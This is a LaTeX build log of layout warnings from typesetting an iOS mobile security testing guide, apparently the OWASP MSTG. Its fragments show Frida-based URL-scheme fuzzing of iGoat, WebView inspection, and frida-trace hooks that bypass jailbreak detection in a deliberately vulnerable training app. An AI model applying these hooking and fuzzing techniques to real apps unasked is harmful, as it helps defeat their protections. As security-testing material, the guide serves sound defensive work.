odePro(6)/m/n/10.95 /private/var/mobile/Library/Logs/CrashReporter\TU/SourceSan
sPro(0)/m/n/10.95 . 

Overfull \hbox (98.8994pt too wide) in paragraph at lines 43003--43007
\TU/SourceSansPro(0)/m/n/10.95 iGoat-Swift app supports the following URL schem
e and parameters: \TU/SourceCodePro(6)/m/n/10.95 iGoat://?contactNumber={0}&mes
sage={0}\TU/SourceSansPro(0)/m/n/10.95 . 

Overfull \hbox (45.17938pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 [iPhone::SpringBoard]-> fuzz("iGoat", "iGoat:/
/?contactNumber={0}&message={0}")[] 
[745]
Overfull \hbox (156.86938pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 Opened URL: iGoat://?contactNumber=AAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (156.86938pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 Opened URL: iGoat://?contactNumber=AAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 &message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 
[746]
Overfull \hbox (127.88235pt too wide) in paragraph at lines 43060--43065
\TU/SourceSansPro(0)/m/n/10.95 could be the case. We would be able to inspect t
he crash reports in \TU/SourceCodePro(6)/m/n/10.95 /private/var/mobile/Library/
Logs/CrashReporter
[747]
Underfull \hbox (badness 6978) in paragraph at lines 43121--43125
[]\TU/SourceSansPro(0)/m/n/10.95 JavaScript is enabled by default but thanks to
 the \TU/SourceCodePro(6)/m/n/10.95 javaScriptEnabled \TU/SourceSansPro(0)/m/n/
10.95 property of

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/aa3dda3347111e374cb9b24068c0d2054439c109.
png" > [748] [749]
Overfull \hbox (29.84943pt too wide) in paragraph at lines 43238--43238
[]\TU/SourceCodePro(6)/m/n/10.95 625 0x00031670 0x100031670  17  18 (5.__TEXT._
_cstring) ascii unwindToWKWebView[] 
[750]
Overfull \hbox (115.2594pt too wide) in paragraph at lines 43251--43251
[]\TU/SourceCodePro(6)/m/n/10.95 0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5fr
ame_So0aB13ConfigurationC13configurationtcfC[] 

Overfull \hbox (128.39935pt too wide) in paragraph at lines 43251--43251
[]\TU/SourceCodePro(6)/m/n/10.95 0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5fr
ame_So0aB13ConfigurationC13configurationtcfcTO[] 

Overfull \hbox (115.2594pt too wide) in paragraph at lines 43251--43251
[]\TU/SourceCodePro(6)/m/n/10.95 0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5fr
ame_So0aB13ConfigurationC13configurationtcfC[] 

Overfull \hbox (128.39935pt too wide) in paragraph at lines 43251--43251
[]\TU/SourceCodePro(6)/m/n/10.95 0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5fr
ame_So0aB13ConfigurationC13configurationtcfcTO[] 

Overfull \hbox (187.52933pt too wide) in paragraph at lines 43260--43260
[]\TU/SourceCodePro(6)/m/n/10.95 $ xcrun swift-demangle __T0So9WKWebViewCABSC6C
GRectV5frame_So0aB13ConfigurationC13configurationtcfcTO[] 

Overfull \hbox (51.74957pt too wide) in paragraph at lines 43260--43260
[]                                \TU/SourceCodePro(6)/m/n/10.95 configuration:
 __C.WKWebViewConfiguration) -> __C.WKWebView[] 

Overfull \hbox (69.26941pt too wide) in paragraph at lines 43287--43287
[]\TU/SourceCodePro(6)/m/n/10.95 391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT._
_objc_methname) ascii javaScriptEnabled[] 

Overfull \hbox (95.54941pt too wide) in paragraph at lines 43287--43287
[]\TU/SourceCodePro(6)/m/n/10.95 392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT._
_objc_methname) ascii setJavaScriptEnabled:[] 
[751] [752] [753]
Underfull \hbox (badness 2469) in paragraph at lines 43463--43466
[]\TU/SourceSansPro(0)/m/n/10.95 For \TU/SourceCodePro(6)/m/n/10.95 WKWebView\T
U/SourceSansPro(0)/m/n/10.95 , you should verify if JavaScript is enabled. Use 
[][]\TU/SourceCodePro(6)/m/n/10.95 javaScriptEnabled[][] \TU/SourceSansPro(0)/m
/n/10.95 from
[754]
Overfull \hbox (25.46942pt too wide) in paragraph at lines 43490--43490
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida -U com.authenticationfailure.WheresMyB
rowser -l webviews_inspector.js[] 

Overfull \hbox (93.3594pt too wide) in paragraph at lines 43490--43490
[]\TU/SourceCodePro(6)/m/n/10.95 onMatch:  <WKWebView: 0x1508b1200; frame = (0 
0; 320 393); layer = <CALayer: 0x1c4238f20>>[] 

Overfull \hbox (25.46942pt too wide) in paragraph at lines 43536--43536
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida -U com.authenticationfailure.WheresMyB
rowser -l webviews_inspector.js[] 
[755]
Overfull \hbox (93.3594pt too wide) in paragraph at lines 43536--43536
[]\TU/SourceCodePro(6)/m/n/10.95 onMatch:  <WKWebView: 0x1508b1200; frame = (0 
0; 320 393); layer = <CALayer: 0x1c4238f20>>[] 
[756]
Overfull \hbox (200.66936pt too wide) in paragraph at lines 43632--43632
[]\TU/SourceCodePro(6)/m/n/10.95 let scenario2HtmlPath = Bundle.main.url(forRes
ource: "web/UIWebView/scenario2.html", withExtension: nil)[] 

Overfull \hbox (51.74944pt too wide) in paragraph at lines 43632--43632
[]    \TU/SourceCodePro(6)/m/n/10.95 let scenario2Html = try String(contentsOf:
 scenario2HtmlPath!, encoding: .utf8)[] 

Overfull \hbox (238.88126pt too wide) in paragraph at lines 43638--43647
[]\TU/SourceSansPro(0)/m/n/10.95 When working with \TU/SourceCodePro(6)/m/n/10.
95 WKWebView\TU/SourceSansPro(0)/m/n/10.95 s, Apple recommends using [][]\TU/So
urceCodePro(6)/m/n/10.95 loadHTMLString:baseURL:[][]\TU/SourceSansPro(0)/m/n/10
.95 /[][]\TU/SourceCodePro(6)/m/n/10.95 loadData:MIMEType:textEncodingName:base
URL:[][]

Underfull \hbox (badness 3343) in paragraph at lines 43638--43647
\TU/SourceSansPro(0)/m/n/10.95 to load local HTML files and \TU/SourceCodePro(6
)/m/n/10.95 loadRequest: \TU/SourceSansPro(0)/m/n/10.95 for web content. Typica
lly, the local files are

Underfull \hbox (badness 2573) in paragraph at lines 43638--43647
\TU/SourceSansPro(0)/m/n/10.95 loaded in combination with methods including, am
ong others: [][]\TU/SourceCodePro(6)/m/n/10.95 pathForResource:ofType:[][]\TU/S
ourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (49.55939pt too wide) in paragraph at lines 43670--43670
[]    \TU/SourceCodePro(6)/m/n/10.95 WKWebViewConfiguration *configuration = [[
WKWebViewConfiguration alloc] init];[] 

Overfull \hbox (88.97943pt too wide) in paragraph at lines 43670--43670
[]        \TU/SourceCodePro(6)/m/n/10.95 CGRectGetHeight([UIScreen mainScreen].
bounds) - 84) configuration:configuration];[] 
[757]
Overfull \hbox (139.3494pt too wide) in paragraph at lines 43670--43670
[]    \TU/SourceCodePro(6)/m/n/10.95 NSString *filePath = [[NSBundle mainBundle
] pathForResource:@"example_file" ofType:@"html"];[] 

Overfull \hbox (47.36942pt too wide) in paragraph at lines 43670--43670
[]    \TU/SourceCodePro(6)/m/n/10.95 [self.webView loadHTMLString:html baseURL:
[NSBundle mainBundle].resourceURL];[] 

Overfull \hbox (200.66936pt too wide) in paragraph at lines 43682--43682
[]\TU/SourceCodePro(6)/m/n/10.95 let scenario2HtmlPath = Bundle.main.url(forRes
ource: "web/WKWebView/scenario2.html", withExtension: nil)[] 

Overfull \hbox (51.74944pt too wide) in paragraph at lines 43682--43682
[]    \TU/SourceCodePro(6)/m/n/10.95 let scenario2Html = try String(contentsOf:
 scenario2HtmlPath!, encoding: .utf8)[] 

Overfull \hbox (5.7594pt too wide) in paragraph at lines 43690--43690
[]\TU/SourceCodePro(6)/m/n/10.95 231 0x0002df6c 24 (4.__TEXT.__objc_methname) a
scii loadHTMLString:baseURL:[] 

Overfull \hbox (51.52684pt too wide) in paragraph at lines 43699--43708
[]\TU/SourceSansPro(0)/m/n/10.95 In addition, you should also verify if the app
 is using the method [][]\TU/SourceCodePro(6)/m/n/10.95 loadFileURL:allowingRea
dAccessToURL:[][]\TU/SourceSansPro(0)/m/n/10.95 .

Overfull \hbox (115.25938pt too wide) in paragraph at lines 43717--43717
[]\TU/SourceCodePro(6)/m/n/10.95 var scenario1Url = FileManager.default.urls(fo
r: .libraryDirectory, in: .userDomainMask)[0][] 

Overfull \hbox (38.60938pt too wide) in paragraph at lines 43717--43717
[]\TU/SourceCodePro(6)/m/n/10.95 scenario1Url = scenario1Url.appendingPathCompo
nent("WKWebView/scenario1.html")[] 

Overfull \hbox (30.29405pt too wide) in paragraph at lines 43719--43722
[]\TU/SourceSansPro(0)/m/n/10.95 In this case, the parameter \TU/SourceCodePro(
6)/m/n/10.95 allowingReadAccessToURL \TU/SourceSansPro(0)/m/n/10.95 contains a 
single file “WKWebView/scenario1.html”,
[758]
Overfull \hbox (91.16939pt too wide) in paragraph at lines 43728--43728
[]\TU/SourceCodePro(6)/m/n/10.95 237 0x0002dff1 37 (4.__TEXT.__objc_methname) a
scii loadFileURL:allowingReadAccessToURL:[] 

Underfull \hbox (badness 10000) in paragraph at lines 43764--43769
[]\TU/SourceCodePro(6)/m/n/10.95 allowFileAccessFromFileURLs \TU/SourceSansPro(
0)/m/n/10.95 (\TU/SourceCodePro(6)/m/n/10.95 WKPreferences\TU/SourceSansPro(0)/
m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 false \TU/SourceSansPro(0)/m/n/10.95
 by default): it enables

Underfull \hbox (badness 1127) in paragraph at lines 43764--43769
\TU/SourceSansPro(0)/m/n/10.95 JavaScript running in the context of a \TU/Sourc
eCodePro(6)/m/n/10.95 file:// \TU/SourceSansPro(0)/m/n/10.95 scheme URL to acce
ss content from other

Underfull \hbox (badness 3492) in paragraph at lines 43769--43773
[]\TU/SourceCodePro(6)/m/n/10.95 allowUniversalAccessFromFileURLs \TU/SourceSan
sPro(0)/m/n/10.95 (\TU/SourceCodePro(6)/m/n/10.95 WKWebViewConfiguration\TU/Sou
rceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 false \TU/SourceSansPr
o(0)/m/n/10.95 by de-

Overfull \hbox (104.30936pt too wide) in paragraph at lines 43783--43783
[]\TU/SourceCodePro(6)/m/n/10.95 [webView.configuration.preferences setValue:@Y
ES forKey:@"allowFileAccessFromFileURLs"];[] 

Overfull \hbox (97.73936pt too wide) in paragraph at lines 43789--43789
[]\TU/SourceCodePro(6)/m/n/10.95 webView.configuration.preferences.setValue(tru
e, forKey: "allowFileAccessFromFileURLs")[] 
[759]
Underfull \hbox (badness 1418) in paragraph at lines 43799--43811
\TU/SourceSansPro(0)/m/n/10.95 can be found in the [][]Apple developer documena
tion[][]. Phone links should be then used (e.g. \TU/SourceCodePro(6)/m/n/10.95 
<a

Underfull \hbox (badness 3312) in paragraph at lines 43848--43853
[]\TU/SourceSansPro(0)/m/n/10.95 As we have seen above in “Testing How WebViews
 are Loaded”, if “scenario 2” of the WKWe-

Underfull \hbox (badness 5161) in paragraph at lines 43848--43853
\TU/SourceSansPro(0)/m/n/10.95 bViews is loaded, the app will do so by calling 
[][]\TU/SourceCodePro(6)/m/n/10.95 URLForResource:withExtension:[][] \TU/Source
SansPro(0)/m/n/10.95 and

Underfull \hbox (badness 3291) in paragraph at lines 43854--43856
[]\TU/SourceSansPro(0)/m/n/10.95 To quicky inspect this, you can use frida-trac
e and trace all “loadHTMLString” and “URLForRe-

Overfull \hbox (23.27945pt too wide) in paragraph at lines 43871--43871
[]    \TU/SourceCodePro(6)/m/n/10.95 -m "*[WKWebView *loadHTMLString*]" -m "*[*
 URLForResource:withExtension:]"[] 
[760] [761]
Overfull \hbox (159.5245pt too wide) in paragraph at lines 43923--43923
[]\TU/SourceCodePro(6)/m/n/10 wk[].[]configuration[]().[]preferences[]().[]valu
eForKey_[]([][]allowFileAccessFromFileURLs[][]).[]toString[]())[];[]|  

Overfull \hbox (105.5245pt too wide) in paragraph at lines 43926--43926
[]\TU/SourceCodePro(6)/m/n/10 wk[].[]configuration[]().[]valueForKey_[]([][]all
owUniversalAccessFromFileURLs[][]).[]toString[]())[];[]|  

Overfull \hbox (42.98943pt too wide) in paragraph at lines 43962--43962
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida -U -f com.authenticationfailure.Wheres
MyBrowser -l webviews_inspector.js[] 
[762]
Overfull \hbox (34.22939pt too wide) in paragraph at lines 44020--44020
[]\TU/SourceCodePro(6)/m/n/10.95 [webView valueForKeyPath:@"documentView.webVie
w.mainFrame.javaScriptContext"][] 
[763]
Overfull \hbox (14.5194pt too wide) in paragraph at lines 44056--44056
[]    \TU/SourceCodePro(6)/m/n/10.95 let userContentController = wkWebViewConfi
guration.userContentController[] 

Overfull \hbox (51.7494pt too wide) in paragraph at lines 44056--44056
[]    \TU/SourceCodePro(6)/m/n/10.95 userContentController.removeScriptMessageH
andler(forName: "javaScriptBridge")[] 

Overfull \hbox (29.84946pt too wide) in paragraph at lines 44056--44056
[]            \TU/SourceCodePro(6)/m/n/10.95 let javaScriptBridgeMessageHandler
 = JavaScriptBridgeMessageHandler()[] 

Overfull \hbox (124.01942pt too wide) in paragraph at lines 44056--44056
[]            \TU/SourceCodePro(6)/m/n/10.95 userContentController.add(javaScri
ptBridgeMessageHandler, name: "javaScriptBridge")[] 

Overfull \hbox (115.6463pt too wide) in paragraph at lines 44058--44066
\TU/SourceSansPro(0)/m/n/10.95 causes the JavaScript function \TU/SourceCodePro
(6)/m/n/10.95 window.webkit.messageHandlers.myJavaScriptMessageHandler.postMess
age

Overfull \hbox (27.5245pt too wide) in paragraph at lines 44072--44072
\TU/SourceCodePro(6)/m/n/10 dow[].[]webkit[].[]messageHandlers[].[]javaScriptBr
idge[].[]postMessage[]([[]"multiplyNumbers"[][],[] 
[764]
Overfull \hbox (75.83936pt too wide) in paragraph at lines 44094--44094
[]\TU/SourceCodePro(6)/m/n/10.95 let javaScriptCallBack = "javascriptBridgeCall
Back([]\(functionFromJS)[],[]\(result)[])"[] 

Overfull \hbox (45.1794pt too wide) in paragraph at lines 44094--44094
[]\TU/SourceCodePro(6)/m/n/10.95 message.webView?.evaluateJavaScript(javaScript
CallBack, completionHandler: nil)[] 

Underfull \hbox (badness 2538) in paragraph at lines 44135--44143
\TU/SourceSansPro(0)/m/n/10.95 iOS WebViews ([][]\TU/SourceCodePro(6)/m/n/10.95
 stringByEvaluatingJavaScriptFromString:[][] \TU/SourceSansPro(0)/m/n/10.95 for
 \TU/SourceCodePro(6)/m/n/10.95 UIWebView \TU/SourceSansPro(0)/m/n/10.95 and
[765]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/843077a52818429fe7eadddb9f213dda9441d42b.
png" > [766]
Underfull \hbox (badness 1688) in paragraph at lines 44182--44193
[]\TU/SourceSansPro(0)/m/n/10.95 iOS comes with two protocols for object encodi
ng and decoding for Objective-C or \TU/SourceCodePro(6)/m/n/10.95 NSObject\TU/S
ourceSansPro(0)/m/n/10.95 s:
[767]
Overfull \hbox (12.32938pt too wide) in paragraph at lines 44271--44271
[]\TU/SourceCodePro(6)/m/n/10.95 NSKeyedArchiver.archiveRootObject(customPoint,
 toFile: "/path/to/archive")[] 

Overfull \hbox (104.30934pt too wide) in paragraph at lines 44271--44271
[]\TU/SourceCodePro(6)/m/n/10.95 guard let customPoint = NSKeyedUnarchiver.unar
chiveObjectWithFile("/path/to/archive") as?[] 
[768] [769]
Overfull \hbox (0.46265pt too wide) in paragraph at lines 44355--44358
[]\TU/SourceSansPro(0)/m/n/10.95 Next, Apple provides support for JSON encoding
/decoding directly by combining \TU/SourceCodePro(6)/m/n/10.95 Codable \TU/Sour
ceSansPro(0)/m/n/10.95 together with

Overfull \hbox (25.46938pt too wide) in paragraph at lines 44401--44401
[]\TU/SourceCodePro(6)/m/n/10.95 NSUserDefaults.standardUserDefaults().setObjec
t(data, forKey: "customPoint")[] 
[770]
Overfull \hbox (119.63936pt too wide) in paragraph at lines 44401--44401
[]\TU/SourceCodePro(6)/m/n/10.95 if let data = NSUserDefaults.standardUserDefau
lts().objectForKey("customPoint") as? NSData {[] 

Overfull \hbox (106.4994pt too wide) in paragraph at lines 44423--44423
[]    \TU/SourceCodePro(6)/m/n/10.95 UserDefaults.standard.set(try? PropertyLis
tEncoder().encode(points), forKey: "points")[] 

Overfull \hbox (110.87943pt too wide) in paragraph at lines 44423--44423
[]        \TU/SourceCodePro(6)/m/n/10.95 let points2 = try? PropertyListDecoder
().decode([CustomPointStruct].self, from: data)[] 
[771]
Overfull \hbox (55.11115pt too wide) in paragraph at lines 44460--44463
[]\TU/SourceSansPro(0)/m/n/10.95 When not using third party libraries, but Appl
e’s \TU/SourceCodePro(6)/m/n/10.95 XMLParser\TU/SourceSansPro(0)/m/n/10.95 , be
 sure to let \TU/SourceCodePro(6)/m/n/10.95 shouldResolveExternalEntities
[772] [773]
Underfull \hbox (badness 10000) in paragraph at lines 44631--44634
[][][][][][] [] [][] [] [][][][] [] [][][][] [] [][][][][][][][] [] [][][][][] 
[] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][][] [] [][][] [] []
[][][][][][] [] [][] [] [][][] [] [][][][] []
[774]
Underfull \hbox (badness 10000) in paragraph at lines 44705--44707
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][]
[][][][][][][][][][] [] [][][][][][][][][][] [] [][][][][][][][] [] [][][] [] [
][][][][][][][][][][][][] [] [][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 44713--44715
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][]
[][][][][][][][][][] [] [][][][][][][][][][] [] [][][][][][][][] [] [][][] [] [
][][][][][][][][][][][][] [] [][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 44715--44717
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][]
[][][][][][][][][][] [] [][][][][][][][][][] [] [][][][][][][][] [] [][][] [] [
][][][][][][][][][][][][] [] [][][][][] []

Overfull \hbox (14.78555pt too wide) in paragraph at lines 44719--44721
[][][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][] [][] [][][] [][] [][]
[][][] [][] [][][][][][][][][][][] [] [][][][][][][][][] [][] [][] [][] [][][][
][][][] [][] [][][][] [][] [][][][][][][][] [][] [][][][][][][][][][][][]$[][] 

[775]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 44777--44777
[]\TU/SourceCodePro(6)/m/n/10.95 CodeDirectory v=20200 size=154808 flags=0x0(no
ne) hashes=4830+5 location=embedded[] 
[776]
Underfull \hbox (badness 3375) in paragraph at lines 44815--44818
[]\TU/SourceSansPro(0)/m/n/10.95 Under ‘Apple LVM - Preprocessing’ and ‘Preproc
essor Macros’, make sure ‘DEBUG’ or ‘DE-
[777] [778]
Underfull \hbox (badness 4205) in paragraph at lines 44923--44926
[]\TU/SourceSansPro(0)/m/n/10.95 Search the code for the following printing fun
ctions: \TU/SourceCodePro(6)/m/n/10.95 NSLog\TU/SourceSansPro(0)/m/n/10.95 , \T
U/SourceCodePro(6)/m/n/10.95 println\TU/SourceSansPro(0)/m/n/10.95 , \TU/Source
CodePro(6)/m/n/10.95 print\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)
/m/n/10.95 dump\TU/SourceSansPro(0)/m/n/10.95 ,
[779] [780]
Underfull \hbox (badness 2368) in paragraph at lines 45048--45052
[]\TU/SourceSansPro(0)/m/n/10.95 There are three widely used package management
 tools [][]Swift Package Manager[][], [][]Carthage[][], and
[781] [782] [783] [784] [785] [786]
Underfull \hbox (badness 1558) in paragraph at lines 45455--45474
[]\TU/SourceSansPro(0)/m/n/10.95 Exception handing in Swift (2 - 5) is quite di
fferent. The try-catch block is not there to handle
[787] [788] [789]
Overfull \hbox (222.56935pt too wide) in paragraph at lines 45632--45632
[]    \TU/SourceCodePro(6)/m/n/10.95 guard let url = URL(string: "https://raw.g
ithubusercontent.com/OWASP/owasp-mstg/master/book.json") else {[] 

Overfull \hbox (62.6994pt too wide) in paragraph at lines 45632--45632
[]\TU/SourceCodePro(6)/m/n/10.95 func request(url: URL, completion: @escaping (
Result<MSTG, RequestError>) -> Void) {[] 
[790]
Overfull \hbox (40.7995pt too wide) in paragraph at lines 45632--45632
[]                \TU/SourceCodePro(6)/m/n/10.95 guard let response = try? deco
der.decode(MSTG.self, from: data) else {[] 
[791]
Overfull \hbox (25.98166pt too wide) in paragraph at lines 45717--45722
\TU/SourceSansPro(0)/m/n/10.95 that shouldn’t be easily retrievable. The handle
r can be set via \TU/SourceCodePro(6)/m/n/10.95 NSSetUncaughtExceptionHandler\T
U/SourceSansPro(0)/m/n/10.95 . 
[792]
Overfull \hbox (111.40877pt too wide) in paragraph at lines 45828--45832
[]\TU/SourceSansPro(0)/m/n/10.95 Next, you can check whether memory is freed to
o fast or too slow by enabling \TU/SourceCodePro(6)/m/n/10.95 NSAutoreleaseFree
dObjectCheckEnabled\TU/SourceSansPro(0)/m/n/10.95 ,
[793] [794] [795]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/88d9e255a1243b1933f293f801ad60b967a4ed03.
png" > [796]
Underfull \hbox (badness 10000) in paragraph at lines 46032--46034
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][]
[][][][] [] [][][][][][][] [] [][][][][][][][][][][][][] [] [][][][][] [] [][][
][][][][][][][] [] [][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 46034--46035
[][][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][][][] [][] [][][]
[][][][][][][][] [] [][][] [][] [][][][][][][][][][][] [][] [][][][][][] [][] [
][][][][] [][] [][][][][] [][] [][][] [][] [][][][][] [][]
[797]
Underfull \hbox (badness 10000) in paragraph at lines 46093--46095
[]\TU/SourceSansPro(0)/m/n/10.95 Codesign - [][]$[][][][][] [] [] [] [][][][][]
[][][][] [] [][][][][] [] [][][] [] [][][][][][][] [] [][][][][][][] [] [][][][
][][][][][][][][][] [] [][][][][][][][] [] [][][][][][][][][][] []
[798]
Overfull \hbox (102.1194pt too wide) in paragraph at lines 46186--46186
[]   \TU/SourceCodePro(6)/m/n/10.95 [[NSFileManager defaultManager] removeItemA
tPath:@"/private/jailbreak.txt" error:nil];[] 
[799]
Overfull \hbox (259.79935pt too wide) in paragraph at lines 46198--46198
[]\TU/SourceCodePro(6)/m/n/10.95 if([[UIApplication sharedApplication] canOpenU
RL:[NSURL URLWithString:@"cydia://package/com.example.package"]]){[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/cf614ae451bbad93635811b9e53554f0f55bbc3c.
png" > [800]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a9246692bf50d7cf2d6312b100d30e7c6deea379.
png" > [801]
Underfull \hbox (badness 1024) in paragraph at lines 46271--46276
[]\TU/SourceSansPro(0)/m/n/10.95 As you can see, our class method was called di
rectly, and it returned “true”. Now, let’s call the

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/aa88d9be69692cc72825cb21b5db66c3a3b04933.
png" > [802]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a3c0b37c8ec6ce33695b9fb2794d8af5880f033d.
png" >
Overfull \hbox (314.54935pt too wide) in paragraph at lines 46354--46354
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida-trace -U -f /Applications/DamnVulnerab
leIOSApp.app/DamnVulnerableIOSApp  -m "-[JailbreakDetectionVC isJailbroken]"[] 

[803]
Overfull \hbox (321.11934pt too wide) in paragraph at lines 46387--46387
[]\TU/SourceCodePro(6)/m/n/10.95 $ frida-trace -U -f /Applications/DamnVulnerab
leIOSApp.app/DamnVulnerableIOSApp  -m "-[JailbreakDetectionVC isJailbroken]:"[]
 

Overfull \hbox (255.41933pt too wide) in paragraph at lines 46387--46387
[]\TU/SourceCodePro(6)/m/n/10.95 -[JailbreakDetectionVC isJailbroken]: Loaded h
andler at "./__handlers__/__JailbreakDetectionVC_isJailbroken_.js"[] 
[804] [805] [806] [807]
Overfull \hbox (36.41942pt too wide) in paragraph at lines 46571--46571
[]\TU/SourceCodePro(6)/m/n/10.95 typedef int (*ptrace_ptr_t)(int _request, pid_
t _pid, caddr_t _addr, int _data);[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7e0b90280358800d0d8dd506c16a9aa7131f24db.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ce91965ea5c01a401c81870af5e87e03516b28d1.
png" > [808] [809]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/14eb01600e94692001b0400a81a0fe1cf64da602.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/cc3959523dec4d1ba423fc34e7a72ba96a9fa1fb.
png" > [810] [811] [812] [813]
Overfull \hbox (97.73941pt too wide) in paragraph at lines 46845--46845
[]    \TU/SourceCodePro(6)/m/n/10.95 NSMutableData* digestBuffer = [NSMutableDa
ta dataWithLength:CC_SHA256_DIGEST_LENGTH];[] 

Overfull \hbox (491.93927pt too wide) in paragraph at lines 46845--46845
